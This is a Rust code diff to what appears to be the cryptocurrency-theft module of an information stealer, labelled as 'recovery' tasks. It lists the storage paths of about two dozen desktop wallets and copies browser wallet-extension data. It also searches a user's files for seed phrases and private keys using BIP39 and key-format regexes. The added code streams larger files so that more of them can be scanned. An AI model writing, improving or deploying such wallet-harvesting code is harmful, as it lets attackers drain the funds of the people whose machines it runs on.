@@ -10,6 +10,7 @@ use serde::Serialize;
 use std::path::{Path, PathBuf};
 use std::sync::Arc;
 use tokio::fs;
+use tokio::io::AsyncReadExt;
 use walkdir::WalkDir;
 
 pub fn wallet_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
@@ -127,11 +128,11 @@ impl RecoveryTask for WalletInventoryTask {
         for spec in &self.specs {
             let mut record = WalletInventoryRecord {
                 label: spec.label.to_string(),
-                roots:
-                    spec.sources
-                        .iter()
-                        .map(|path| path.display().to_string())
-                        .collect(),
+                roots: spec
+                    .sources
+                    .iter()
+                    .map(|path| path.display().to_string())
+                    .collect(),
                 exists: false,
                 file_count: 0,
                 total_bytes: 0,
@@ -233,29 +234,119 @@ pub fn wallet_specs(
     let home = &ctx.home_dir;
 
     vec![
-        ("Ethereum", vec![roaming.join("Ethereum").join("keystore")], vec![], "Ethereum"),
-        ("Electrum", vec![roaming.join("Electrum").join("wallets")], vec![], "Electrum"),
-        ("Atomic", vec![roaming.join("atomic").join("Local Storage").join("leveldb")], vec![], "Atomic"),
-        ("Exodus", vec![], vec![roaming.join("Exodus").join("exodus.wallet")], "Exodus"),
-        ("Jaxx", vec![roaming.join("com.liberty.jaxx").join("IndexedDB").join("file__0.indexeddb.leveldb")], vec![], "Jaxx"),
-        ("Coinomi", vec![roaming.join("Coinomi").join("Coinomi").join("wallets")], vec![], "Coinomi"),
-        ("Guarda", vec![roaming.join("Guarda").join("Local Storage").join("leveldb")], vec![], "Guarda"),
-        ("Zephyr", vec![roaming.join("Zephyr").join("wallets")], vec![], "Zephyr"),
+        (
+            "Ethereum",
+            vec![roaming.join("Ethereum").join("keystore")],
+            vec![],
+            "Ethereum",
+        ),
+        (
+            "Electrum",
+            vec![roaming.join("Electrum").join("wallets")],
+            vec![],
+            "Electrum",
+        ),
+        (
+            "Atomic",
+            vec![roaming.join("atomic").join("Local Storage").join("leveldb")],
+            vec![],
+            "Atomic",
+        ),
+        (
+            "Exodus",
+            vec![],
+            vec![roaming.join("Exodus").join("exodus.wallet")],
+            "Exodus",
+        ),
+        (
+            "Jaxx",
+            vec![
+                roaming
+                    .join("com.liberty.jaxx")
+                    .join("IndexedDB")
+                    .join("file__0.indexeddb.leveldb"),
+            ],
+            vec![],
+            "Jaxx",
+        ),
+        (
+            "Coinomi",
+            vec![roaming.join("Coinomi").join("Coinomi").join("wallets")],
+            vec![],
+            "Coinomi",
+        ),
+        (
+            "Guarda",
+            vec![roaming.join("Guarda").join("Local Storage").join("leveldb")],
+            vec![],
+            "Guarda",
+        ),
+        (
+            "Zephyr",
+            vec![roaming.join("Zephyr").join("wallets")],
+            vec![],
+            "Zephyr",
+        ),
         ("Armory", vec![roaming.join("Armory")], vec![], "Armory"),
-        ("Bytecoin", vec![roaming.join("bytecoin")], vec![], "Bytecoin"),
+        (
+            "Bytecoin",
+            vec![roaming.join("bytecoin")],
+            vec![],
+            "Bytecoin",
+        ),
         ("Zcash", vec![roaming.join("Zcash")], vec![], "Zcash"),
         ("Dash", vec![roaming.join("DashCore")], vec![], "Dash"),
-        ("Monero", vec![home.join("Documents").join("Monero").join("wallets")], vec![], "Monero"),
+        (
+            "Monero",
+            vec![home.join("Documents").join("Monero").join("wallets")],
+            vec![],
+            "Monero",
+        ),
         ("Bitcoin", vec![roaming.join("Bitcoin")], vec![], "Bitcoin"),
-        ("Litecoin", vec![roaming.join("Litecoin")], vec![], "Litecoin"),
-        ("Dogecoin", vec![roaming.join("Dogecoin")], vec![], "Dogecoin"),
+        (
+            "Litecoin",
+            vec![roaming.join("Litecoin")],
+            vec![],
+            "Litecoin",
+        ),
+        (
+            "Dogecoin",
+            vec![roaming.join("Dogecoin")],
+            vec![],
+            "Dogecoin",
+        ),
         ("Raven", vec![roaming.join("Raven")], vec![], "Raven"),
-        ("MultiBit", vec![roaming.join("MultiBitHD")], vec![], "MultiBit"),
-        ("Wasabi", vec![roaming.join("WalletWasabi").join("Client").join("Wallets")], vec![], "Wasabi"),
-        ("Daedalus", vec![roaming.join("Daedalus Mainnet").join("wallets")], vec![], "Daedalus"),
+        (
+            "MultiBit",
+            vec![roaming.join("MultiBitHD")],
+            vec![],
+            "MultiBit",
+        ),
+        (
+            "Wasabi",
+            vec![roaming.join("WalletWasabi").join("Client").join("Wallets")],
+            vec![],
+            "Wasabi",
+        ),
+        (
+            "Daedalus",
+            vec![roaming.join("Daedalus Mainnet").join("wallets")],
+            vec![],
+            "Daedalus",
+        ),
         ("Yoroi", vec![roaming.join("Yoroi")], vec![], "Yoroi"),
-        ("Terra", vec![roaming.join("Terra Station")], vec![], "Terra"),
-        ("Sparrow", vec![roaming.join("Sparrow").join("wallets")], vec![], "Sparrow"),
+        (
+            "Terra",
+            vec![roaming.join("Terra Station")],
+            vec![],
+            "Terra",
+        ),
+        (
+            "Sparrow",
+            vec![roaming.join("Sparrow").join("wallets")],
+            vec![],
+            "Sparrow",
+        ),
         ("Binance", vec![roaming.join("Binance")], vec![], "Binance"),
     ]
 }
@@ -350,8 +441,16 @@ impl RecoveryTask for ExtensionWalletTask {
                     if ext_path.exists() {
                         let label = format!("Ext_{}_{}", browser_name, wallet_name);
                         let dest_root = wallet_output_dir(ctx, &label).await?;
-                        
-                        copy_dir_limited(&ext_path, &dest_root, &label, &mut artifacts, usize::MAX, 0).await?;
+
+                        copy_dir_limited(
+                            &ext_path,
+                            &dest_root,
+                            &label,
+                            &mut artifacts,
+                            usize::MAX,
+                            0,
+                        )
+                        .await?;
                     }
                 }
             }
@@ -519,10 +618,16 @@ impl RecoveryTask for SeedPhraseDiscoveryTask {
         let dest_root = wallet_output_dir(ctx, "Seeds").await?;
 
         let bip39_regex = Regex::new(r"(?i)\b([a-z]{3,}\s+){11,23}[a-z]{3,}\b").unwrap();
-        let priv_key_regex = Regex::new(r"\b([a-fA-F0-9]{64})|([5KL][1-9A-HJ-NP-Za-km-z]{50,51})\b").unwrap();
-        
-        let target_names = ["seed", "mnemonic", "phrase", "backup", "crypto", "wallet", "secret", "private", "key", "pass"];
-        let target_exts = [".txt", ".doc", ".docx", ".pdf", ".rtf", ".md", ".json", ".log"];
+        let priv_key_regex =
+            Regex::new(r"\b([a-fA-F0-9]{64})|([5KL][1-9A-HJ-NP-Za-km-z]{50,51})\b").unwrap();
+
+        let target_names = [
+            "seed", "mnemonic", "phrase", "backup", "crypto", "wallet", "secret", "private", "key",
+            "pass",
+        ];
+        let target_exts = [
+            ".txt", ".doc", ".docx", ".pdf", ".rtf", ".md", ".json", ".log",
+        ];
 
         for root in &self.roots {
             let walker = WalkDir::new(root)
@@ -545,22 +650,25 @@ impl RecoveryTask for SeedPhraseDiscoveryTask {
 
                 let has_target_ext = target_exts.iter().any(|&ext| name_lower.ends_with(ext));
                 if !has_target_ext {
-                     continue;
+                    continue;
                 }
-                
+
                 let mut should_grab = false;
 
                 if target_names.iter().any(|&s| name_lower.contains(s)) {
                     should_grab = true;
                 }
 
-                if !should_grab && (name_lower.ends_with(".txt") || name_lower.ends_with(".md") || name_lower.ends_with(".log") || name_lower.ends_with(".json")) {
+                if !should_grab
+                    && (name_lower.ends_with(".txt")
+                        || name_lower.ends_with(".md")
+                        || name_lower.ends_with(".log")
+                        || name_lower.ends_with(".json"))
+                {
                     if let Ok(meta) = fs::metadata(path).await {
-                        if meta.len() < 1024 * 50 {
-                            if let Ok(content) = fs::read_to_string(path).await {
-                                if bip39_regex.is_match(&content) || priv_key_regex.is_match(&content) {
-                                    should_grab = true;
-                                }
+                        if meta.len() < 1024 * 1024 * 10 {
+                            if is_file_sensitive(path, &bip39_regex, &priv_key_regex).await {
+                                should_grab = true;
                             }
                         }
                     }
@@ -574,6 +682,37 @@ impl RecoveryTask for SeedPhraseDiscoveryTask {
 
         Ok(artifacts)
     }
+}
+
+async fn is_file_sensitive(path: &Path, bip39: &Regex, priv_key: &Regex) -> bool {
+    let mut file = match fs::File::open(path).await {
+        Ok(f) => f,
+        Err(_) => return false,
+    };
+
+    let mut buffer = vec![0u8; 8192];
+    let mut carry_over = String::new();
+
+    while let Ok(n) = file.read(&mut buffer).await {
+        if n == 0 {
+            break;
+        }
+
+        let chunk = String::from_utf8_lossy(&buffer[..n]);
+        let combined = format!("{}{}", carry_over, chunk);
+
+        if bip39.is_match(&combined) || priv_key.is_match(&combined) {
+            return true;
+        }
+
+        let len = combined.len();
+        carry_over = if len > 256 {
+            combined[len - 256..].to_string()
+        } else {
+            combined
+        };
+    }
+    false
 }
 
 async fn wallet_output_dir(ctx: &RecoveryContext, label: &str) -> Result<PathBuf, RecoveryError> {
